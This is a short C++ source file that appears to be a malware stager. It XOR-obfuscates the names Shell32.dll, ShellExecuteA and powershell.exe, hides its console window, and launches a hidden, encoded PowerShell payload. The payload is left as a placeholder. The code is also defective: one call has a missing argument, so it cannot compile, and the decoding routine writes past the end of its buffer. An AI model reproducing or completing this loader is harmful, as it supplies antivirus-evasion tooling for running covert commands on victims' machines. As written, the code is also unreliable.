// Author: Sina Tamari

#include<iostream>
#include<Windows.h>
typedef int(__stdcall *shle)(HWND h, LPCSTR lp, LPCSTR lpF, LPCSTR lpP, LPCSTR lpD, INT n);
typedef int(__stdcall *cha)(HMODULE h, LPCSTR l);
int length(char* chars)
{
	int i;
	for (i = 0;; i++)
	{
		if (chars[i] == '\0')
			break;
	}
	return i;
}
char* cry(char* buffer, int key)
{
	char*d = new char[length(buffer)];
	int i;
	for (i = 0; i < length(buffer); i++)
	{
		d[i] = char(int(buffer[i]) ^ key);
	}
	d[i] = '\0';
	return d;
}
void DO(char* POWERSHELL_CODES)
{
	HINSTANCE module = LoadLibraryA(cry("Ridmm23/emm",1));
	DWORD dAddress = (DWORD)GetProcAddress(module, cry("RidmmDydbtud@",1));
	shle sh = (shle)dAddress;
	sh(NULL, NULL, cry("qnvdsridmm/dyd",1), , NULL, 0);
}
int main()
{
	FreeConsole();
	DO(cry("XORED_POWERSHELL_CODES",20));
	return 0;
}
